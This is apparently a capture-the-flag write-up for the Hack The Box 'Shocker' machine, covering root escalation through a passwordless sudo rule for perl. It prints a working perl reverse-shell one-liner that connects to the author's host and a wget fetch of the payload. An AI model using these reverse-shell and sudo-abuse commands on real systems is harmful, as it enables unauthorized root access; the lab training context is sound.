# Shell as Shelly

We can now grab the user flag:

![[Pasted image 20210614103814.png]]

## Basic Enumeration

We have a lot of groups:

```bash
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

The `adm` group stands out, as it usually means we can read `/var/log`.

However, a simpler misconfiguration was present:

```bash
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

We can run perl with root permissions. So we can setup a perl script to give us a shell.

[Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) has an example of a perl reverse shell:

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

I created a `rev.cgi` file on my local box, according to [a tutorial](https://www.lcn.com/support/articles/how-to-create-a-perl-script/):

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ cat rev.cgi 
#!/usr/bin/perl

perl -e 'use Socket;$i="10.10.16.211";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

I served the file and downloaded it to `/tmp`:

```bash
shelly@Shocker:/tmp$ wget 10.10.16.211:8000/rev.cgi
wget 10.10.16.211:8000/rev.cgi
--2021-06-14 05:52:18--  http://10.10.16.211:8000/rev.cgi
Connecting to 10.10.16.211:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 239 [application/octet-stream]
Saving to: 'rev.cgi'

     0K                                                       100% 19.6K=0.01s

2021-06-14 05:52:18 (19.6 KB/s) - 'rev.cgi' saved [239/239]
```

Then ran it according to [this](https://stackoverflow.com/questions/17748688/running-perl-script-from-command-line):

```bash
shelly@Shocker:/tmp$ sudo /usr/bin/perl rev.cgi
sudo /usr/bin/perl rev.cgi
syntax error at rev.cgi line 3, near "perl -e "
Execution of rev.cgi aborted due to compilation errors.
```

It won't compile. I tried it as a `.pl` file:

```bash
shelly@Shocker:/tmp$ mv rev.cgi rev.pl
mv rev.cgi rev.pl
shelly@Shocker:/tmp$ sudo /usr/bin/perl rev.pl
sudo /usr/bin/perl rev.pl
syntax error at rev.pl line 3, near "perl -e "
Execution of rev.pl aborted due to compilation errors.
```

Then I realised that the payload I copied wasn't the syntax for a perl file - it was just for an inline perl command in bash. So I didn't even need a file to execute from!

I ran this command instead:

```bash
shelly@Shocker:/tmp$ sudo perl -e 'use Socket;$i="10.10.16.211";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

And got a shell!

![[Pasted image 20210614105016.png]]

That's the box!

![[Pasted image 20210614105225.png]]